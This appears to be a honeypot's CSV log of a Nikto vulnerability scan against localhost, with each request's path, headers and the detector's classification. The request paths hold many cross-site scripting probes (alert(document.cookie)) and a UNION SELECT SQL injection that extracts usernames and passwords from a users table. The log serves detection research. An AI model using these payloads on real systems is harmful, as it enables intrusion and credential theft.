method,path,headers/host,headers/sec-ch-ua,headers/sec-ch-ua-mobile,headers/sec-ch-ua-platform,headers/accept-language,headers/upgrade-insecure-requests,headers/user-agent,headers/accept,headers/sec-fetch-site,headers/sec-fetch-mode,headers/sec-fetch-user,headers/sec-fetch-dest,headers/accept-encoding,headers/cookie,headers/connection,uuid,peer/ip,peer/port,status,cookies/sess_uuid,response_msg/version,response_msg/response/message/detection/name,response_msg/response/message/detection/order,response_msg/response/message/detection/type,response_msg/response/message/detection/version,response_msg/response/message/sess_uuid,timestamp,headers/referer,cookies/ sess_uuid,headers/content-type,headers/content-length,response_msg/response/message/detection/payload/value,response_msg/response/message/detection/payload/page,post_data/dump_sql,post_data/method,post_data/service_name
GET,/phpwebsite/index.php?module=calendar&calendar[view]=day&year=2003%00-1&month=,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000693),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,0fcb16ff-9a6e-4f58-97c2-ed54ca0fbf1e,2025-05-06T05:13:01.252540,,,,,,,,,
GET,/phpBB2/search.php?search_id=1\\,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000694),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,9adf3b62-1d03-4f78-a064-276c4ae3933a,2025-05-06T05:13:01.259544,,,,,,,,,
GET,"/index.php?module=My_eGallery&do=showpic&pid=-1/**/AND/**/1=2/**/UNION/**/ALL/**/SELECT/**/0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,concat(0x3C7230783E,pn_uname,0x3a,pn_pass,0x3C7230783E),0,0,0/**/FROM/**/md_users/**/WHERE/**/pn_uid=$id/*",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000695),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,sqli,2,2,0.6.0,b424329d-c73f-4eb9-8ab2-97623780aae6,2025-05-06T05:13:01.266620,,,,,SQL ERROR: near pid: syntax error,/index.html,,,
GET,/author.asp,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000696),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,d34aa5b5-8e10-4aa4-b041-fea24c3014a0,2025-05-06T05:13:01.277603,,,,,,,,,
GET,/horde/test.php,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000697),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,d1aba4c7-6aee-4d57-819a-2261e2976cb2,2025-05-06T05:13:01.283518,,,,,,,,,
GET,/imp/horde/test.php,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000698),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,e321421d-a7d2-4092-9216-1078b501f5f7,2025-05-06T05:13:01.289678,,,,,,,,,
GET,/examples/cookie,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000700),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,a98d03bb-bcbf-40b6-9ba5-15cd1a81c297,2025-05-06T05:13:01.295372,,,,,,,,,
GET,/examples/session,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000701),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,895e3f9b-4b99-4432-b7fc-44e66ae00dd7,2025-05-06T05:13:01.301066,,,,,,,,,
GET,/themes/mambosimple.php?detection=detected&sitename=</title><script>alert(document.cookie)</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000702),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,a7d23fdb-0a82-4cc7-a270-0f448253b21f,2025-05-06T05:13:01.307666,,,,,</title><script>alert(document.cookie)</script>,/index.html,,,
GET,/index.php?option=search&searchword=<script>alert(document.cookie);</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000703),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,da6376eb-3168-45de-abb8-c07a7e7f14a8,2025-05-06T05:13:01.319055,,,,,<script>alert(document.cookie);</script>,/index.html,,,
GET,"/emailfriend/emailnews.php?id=\""<script>alert(document.cookie)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000704),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,15d8d987-4e35-48f6-b164-c4ea3d6c6086,2025-05-06T05:13:01.332810,,,,,"\""<script>alert(document.cookie)</script>",/index.html,,,
GET,"/emailfriend/emailfaq.php?id=\""<script>alert(document.cookie)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000705),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,ff07b955-c47c-41b1-9f26-175089338f41,2025-05-06T05:13:01.350083,,,,,"\""<script>alert(document.cookie)</script>",/index.html,,,
GET,"/emailfriend/emailarticle.php?id=\""<script>alert(document.cookie)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000706),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,fbdaff80-663e-4b1b-8050-5af8b47f940a,2025-05-06T05:13:01.366760,,,,,"\""<script>alert(document.cookie)</script>",/index.html,,,
GET,"/administrator/upload.php?newbanner=1&choice=\""<script>alert(document.cookie)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000707),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,332c4e76-cdd4-4140-8989-b0dd1eff7341,2025-05-06T05:13:01.382916,,,,,"\""<script>alert(document.cookie)</script>",/index.html,,,
GET,"/administrator/popups/sectionswindow.php?type=web&link=\""<script>alert(document.cookie)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000708),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,1afb43df-4fdd-4425-8cfd-f58b7fe845a8,2025-05-06T05:13:01.400283,,,,,"\""<script>alert(document.cookie)</script>",/index.html,,,
GET,"/administrator/gallery/view.php?path=\""<script>alert(document.cookie)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000709),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,a2cee33a-3450-42d4-bc79-059432d325ff,2025-05-06T05:13:01.417547,,,,,"\""<script>alert(document.cookie)</script>",/index.html,,,
GET,"/administrator/gallery/uploadimage.php?directory=\""<script>alert(document.cookie)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000710),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,f8e1a97b-3e24-420c-b276-80cf643ccbc7,2025-05-06T05:13:01.434253,,,,,"\""<script>alert(document.cookie)</script>",/index.html,,,
GET,"/administrator/gallery/navigation.php?directory=\""<script>alert(document.cookie)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000711),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,14984b88-345c-430c-8f1a-9d5f7347d7ba,2025-05-06T05:13:01.450292,,,,,"\""<script>alert(document.cookie)</script>",/index.html,,,
GET,"/administrator/gallery/gallery.php?directory=\""<script>alert(document.cookie)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000712),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,2fad6147-0e46-46d9-bf45-b007c328629f,2025-05-06T05:13:01.466388,,,,,"\""<script>alert(document.cookie)</script>",/index.html,,,
GET,/index.php?dir=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000713),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,da3eb552-d5fc-4085-8d71-ce013e719f2f,2025-05-06T05:13:01.488583,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,/https-admserv/bin/index?/<script>alert(document.cookie)</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000714),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,10bc4a1f-78cc-431b-81a8-a62a62613db9,2025-05-06T05:13:01.523683,,,,,,,,,
GET,/clusterframe.jsp?cluster=<script>alert(document.cookie)</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000715),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,32c5c333-1e00-4df1-bd4f-cbd1bafb62c1,2025-05-06T05:13:01.538268,,,,,<script>alert(document.cookie)</script>,/index.html,,,
GET,/article.cfm?id=1'<script>alert(document.cookie);</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000716),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,bc8b6164-845d-4714-8b38-7599a501e1d5,2025-05-06T05:13:01.568352,,,,,1'<script>alert(document.cookie);</script>,/index.html,,,
GET,"/upload.php?type=\""<script>alert(document.cookie)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000717),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,4ca96c11-acb3-433a-a661-23f964d3d64c,2025-05-06T05:13:01.607593,,,,,"\""<script>alert(document.cookie)</script>",/index.html,,,
GET,"/soinfo.php?\""><script>alert('Vulnerable')</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000718),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,9c146bd0-7b74-4d04-8997-5f609afaaeb2,2025-05-06T05:13:01.646049,,,,,,,,,
GET,/modules.php?op=modload&name=News&file=index&catid=&topic=><script>alert('Vulnerable');</script>;,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000719),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,66686283-ba1c-489f-a7bc-c5adee102132,2025-05-06T05:13:01.666255,,,,,><script>alert('Vulnerable');</script>;,/index.html,,,
GET,/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000720),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,a9970db5-4cb5-4470-a02f-23473afb405e,2025-05-06T05:13:01.706047,,,,,<script>alert('Vulnerable');</script>,/index.html,,,
GET,/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script+>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000721),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,7bce553c-6818-4599-b19d-5fb3baa4a197,2025-05-06T05:13:01.745005,,,,,<script>alert('Vulnerable');</script >,/index.html,,,
GET,/webtop/wdk/samples/dumpRequest.jsp?J=%3Cscript%3Ealert('Vulnerable');%3C/script%3Ef,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000722),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,7f8d6d05-faad-4cc2-9d30-8e69e1a19c6e,2025-05-06T05:13:01.783561,,,,,<script>alert('Vulnerable');</script>f,/index.html,,,
GET,/addyoursite.php?catid=&lt;Script&gt;JavaScript:alert('Vulnerable');&lt;/Script&gt;,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000723),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,5ed900e0-3bfd-4666-a12c-38d67caf1dde,2025-05-06T05:13:01.824090,,,,,,,,,
GET,/666%0a%0a<script>alert('Vulnerable');</script>666.jsp,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000724),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,3a142fac-b77f-4c50-bbe0-cded7a45aefc,2025-05-06T05:13:01.844636,,,,,,,,,
GET,/servlet/MsgPage?action=test&msg=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000725),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,ef00918b-9d3b-49c4-b72d-c6b82fe4d640,2025-05-06T05:13:01.866722,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,/servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000726),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,59430a6e-3396-4e3d-9089-95c72be8d2dc,2025-05-06T05:13:01.902341,,,,,,,,,
GET,/servlet/org.apache.catalina.Context/<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000727),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,3ce465fd-7c88-4e65-b9ab-5d7a109f4a22,2025-05-06T05:13:01.921956,,,,,,,,,
GET,/servlet/org.apache.catalina.Globals/<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000728),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,7fbd5ea0-c65a-4ba6-b68f-55d51965d7f3,2025-05-06T05:13:01.942104,,,,,,,,,
GET,/servlet/org.apache.catalina.servlets.WebdavStatus/<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000729),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,6519b6b8-2828-4f22-b4ed-f37fa686e958,2025-05-06T05:13:01.961310,,,,,,,,,
GET,/servlets/MsgPage?action=badlogin&msg=<script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000730),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,5bcc35e1-5f56-4dc9-ae22-07d6bb91bc17,2025-05-06T05:13:01.982331,,,,,<script>alert('Vulnerable')</script>,/index.html,,,
GET,/<script>alert('Vulnerable')</script>.shtm,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000731),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,912b3977-fa7f-4623-8039-ba01e2ca3539,2025-05-06T05:13:02.018922,,,,,,,,,
GET,/<script>alert('Vulnerable')</script>.stm,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000732),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,a1ea668e-0008-4897-95f9-bc6c861421dc,2025-05-06T05:13:02.037224,,,,,,,,,
GET,"/admin/sh_taskframes.asp?Title=Configuraci%C3%B3n%20de%20registro%20Web&URL=MasterSettings/Web_LogSettings.asp?tab1=TabsWebServer%26tab2=TabsWebLogSettings%26__SAPageKey=5742D5874845934A134CD05F39C63240&ReturnURL=\""><script>alert(document.cookie)</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000733),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,42785800-1b06-41f6-8c52-556fd841706b,2025-05-06T05:13:02.060205,,,,,"\""><script>alert(document.cookie)</script>",/index.html,,,
GET,"/SiteServer/Knowledge/Default.asp?ctr=\""><script>alert('Vulnerable')</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000734),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,d03668d5-160a-4713-acde-4c3df3232ed9,2025-05-06T05:13:02.100997,,,,,"\""><script>alert('Vulnerable')</script>",/index.html,,,
GET,"/_mem_bin/formslogin.asp?\""><script>alert('Vulnerable')</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000735),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,0e395376-fd73-4335-90ba-86af493ac1ef,2025-05-06T05:13:02.139759,,,,,,,,,
GET,/nosuchurl/><script>alert('Vulnerable')</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000736),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,aa7a30bf-d992-48cb-9b77-23d91040f724,2025-05-06T05:13:02.159286,,,,,,,,,
GET,/test.php?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000737),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,c7f6a8e7-9e45-419c-8e2c-e1ca26091597,2025-05-06T05:13:02.179694,,,,,,,,,
GET,/test.shtml?%3CSCRIPT%3Ealert('Vulnerable')%3C%2FSCRIPT%3E=x,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000738),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,2a6dbf2f-dbfc-426f-b484-808a7b256ebb,2025-05-06T05:13:02.199852,,,,,,,,,
GET,/search/results.stm?query=&lt;script&gt;alert('vulnerable');&lt;/script&gt;,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000740),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,92195ffb-1265-46ca-8e45-d43557ee4b59,2025-05-06T05:13:02.221101,,,,,,,,,
GET,/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000741),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,b6995bac-73c2-44ab-97c3-f99ff9ceb3b6,2025-05-06T05:13:02.242739,,,,,<script>alert(document.cookie)</script>,/index.html,,,
GET,/~/<script>alert('Vulnerable')</script>.aspx?aspxerrorpath=null,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000767),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,b97a2c7c-26e0-4056-b709-36a00da5e2e6,2025-05-06T05:13:02.286884,,,,,,,,,
GET,/~/<script>alert('Vulnerable')</script>.aspx,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000768),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,e37047c7-d3f4-4b81-9ef0-3dfc3448cfd7,2025-05-06T05:13:02.306613,,,,,,,,,
GET,/~/<script>alert('Vulnerable')</script>.asp,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000769),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,9d64f7a9-d125-4012-af5e-f5cea600efef,2025-05-06T05:13:02.325270,,,,,,,,,
GET,/z_user_show.php?method=showuserlink&class=<Script>javascript:alert(document.cookie)</Script>&rollid=admin&x=3da59a9da8825&,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000770),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,01d24360-bf28-41ff-8dbc-0683f32528cb,2025-05-06T05:13:02.348481,,,,,<Script>javascript:alert(document.cookie)</Script>,/index.html,,,
GET,/catinfo?<u><b>TESTING,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000771),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,273ac8bf-de19-44bb-a722-8a50b33d724a,2025-05-06T05:13:02.387265,,,,,,,,,
GET,"/webchat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>",localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000772),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,fd5df63c-65d8-44bf-bb21-c8f2da5311b8,2025-05-06T05:13:02.408434,,,,,"<script>alert (\""Vulnerable\"")</script>
<script>alert (\""Vulnerable\"")</script>",/index.html,,,
GET,/webamil/test.php,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000773),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,92b1b4a1-13a8-4f7f-8b38-040bf33d79ae,2025-05-06T05:13:02.450144,,,,,,,,,
GET,/users.php?mode=profile&uid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000774),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,9e073124-6513-4dd7-a66f-079b0a5e0958,2025-05-06T05:13:02.471035,,,,,,,,,
GET,/usercp.php?function=avataroptions:javascript:alert(%27Vulnerable%27),localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000775),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,9388dec0-8e87-4477-968f-518c37d8bede,2025-05-06T05:13:02.491224,,,,,,,,,
GET,/user.php?op=userinfo&uname=<script>alert('hi');</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000776),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,97504c81-4357-409a-9d86-edc8ba7d06c3,2025-05-06T05:13:02.511287,,,,,<script>alert('hi');</script>,/index.html,,,
GET,/TopSitesdirectory/help.php?sid=&lt;script&gt;alert(document.cookie)&lt;/script&gt;,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000779),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,index,1,1,0.6.0,c215282e-cec6-479c-85d0-3ceabbcc7e2f,2025-05-06T05:13:02.551165,,,,,,,,,
GET,/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000780),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,c13e7529-b51f-4837-bc7c-132552163415,2025-05-06T05:13:02.570828,,,,,<script>javascript:alert(document.cookie)</script>,/index.html,,,
GET,/templates/form_header.php?noticemsg=<script>javascript:alert(document.cookie)</script>,localhost,,,,,,Mozilla/5.00 (Nikto/2.1.5) (Evasions:None) (Test:000781),,,,,,,,Keep-Alive,35c07117-8e71-4adf-ae8b-7f21142a0c19,172.18.0.1,59226,200,,0.6.0,xss,3,2,0.6.0,a2b10a7b-cda2-4655-ae1e-9264f2e66fad,2025-05-06T05:13:02.608834,,,,,<script>javascript:alert(document.cookie)</script>,/index.html,,,
